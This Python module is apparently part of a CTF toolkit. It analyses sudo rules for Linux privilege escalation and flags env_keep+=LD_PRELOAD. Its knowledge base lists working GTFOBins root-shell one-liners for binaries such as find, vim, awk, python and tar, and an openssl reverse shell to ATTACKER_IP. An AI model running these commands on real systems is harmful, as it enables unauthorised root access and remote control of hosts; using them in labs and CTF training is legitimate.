"""
CTFKit - Linux PrivEsc
SUDO Analyzer
"""

from pathlib import Path


# ==========================================
# KNOWLEDGE BASE
# ==========================================

GTFOBINS = {

    "bash": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo bash"
        ]
    },

    "find": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo find . -exec /bin/sh \\; -quit"
        ]
    },

    "vim": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo vim -c ':!/bin/sh'"
        ]
    },

    "vi": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo vi -c ':!/bin/sh'"
        ]
    },

    "less": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo less /etc/hosts",
            "!sh"
        ]
    },

    "more": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo more /etc/hosts",
            "!sh"
        ]
    },

    "awk": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        ]
    },

    "sed": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
        ]
    },

    "env": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo env /bin/sh"
        ]
    },

    "python": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo python -c 'import os; os.system(\"/bin/sh\")'"
        ]
    },

    "python3": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
        ]
    },

    "perl": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo perl -e 'exec \"/bin/sh\";'"
        ]
    },

    "ruby": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo ruby -e 'exec \"/bin/sh\"'"
        ]
    },

    "tar": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        ]
    },

    "openssl": {
        "priority": "HIGH",
        "reason": "https://gtfobins.org/gtfobins/openssl",
        "recommendation": [
            "openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem",
            "mkfifo /tmp/fifo",
            "/bin/sh -i </tmp/fifo 2>&1 | sudo openssl s_client -quiet -connect ATTACKER_IP:443 >/tmp/fifo"
        ]
    },

}


# ==========================================
# PARSER
# ==========================================

def _parse(section):

    defaults = []
    rules = []

    for line in section.splitlines():

        line = line.strip()

        if not line:
            continue

        if line.startswith(">>>"):
            continue

        #
        # Defaults
        #
        if line.startswith("env_") or "env_keep" in line:

            defaults.append(line)

            continue

        #
        # Sudo rules
        #
        if line.startswith("("):

            rules.append(line)

    return defaults, rules


# ==========================================
# CLASSIFIER
# ==========================================

def _classify(rule):

    command = rule.split(":")[-1].strip()

    binary = Path(command).name

    if binary in GTFOBINS:

        return "gtfobins", command, GTFOBINS[binary]

    return "custom", command, binary


# ==========================================
# PUBLIC API
# ==========================================

def analyze(section):

    defaults, rules = _parse(section)

    results = {

        "GTFOBins": [],
        "Custom": [],
        "Defaults": [],
        "Total": 0,

    }

    findings = []

    #
    # LD_PRELOAD
    #
    has_ld_preload = any("LD_PRELOAD" in d for d in defaults)

    if has_ld_preload:
        results["Defaults"].append("env_keep+=LD_PRELOAD")

        #
        # Only interesting if the user can actually sudo something.
        #
        if len(rules) > 0:
            command = rules[0].split(":")[-1].strip()
            findings.append({

                "priority": "HIGH",
                "module": "SUDO",
                "title": "env_keep+=LD_PRELOAD",
                "reason": "LD_PRELOAD preserved by sudo and one or more sudo rules are available.",
                "recommendation": [
                    f"Run: ctf privesc.linux.sudo.ld_preload {command}"
                ]

            })

    #
    # Rules
    #
    for rule in rules:

        category, command, info = _classify(rule)

        results["Total"] += 1

        if category == "gtfobins":

            results["GTFOBins"].append(command)

            findings.append({

                "priority": info["priority"],
                "module": "SUDO",
                "title": command,
                "reason": info["reason"],
                "recommendation": info["recommendation"]

            })

        else:

            results["Custom"].append(command)

            findings.append({

                "priority": "LOW",
                "module": "SUDO",
                "title": command,
                "reason": "Interesting sudo rule",
                "recommendation": [
                    "Review the rule manually."
                ]

            })

    return {

        "module": "SUDO",

        "summary": {

            "GTFOBins": len(results["GTFOBins"]),
            "Defaults": len(results["Defaults"]),
            "Custom": len(results["Custom"]),
            "Total": results["Total"],

        },

        "findings": findings,

        "details": results

    }

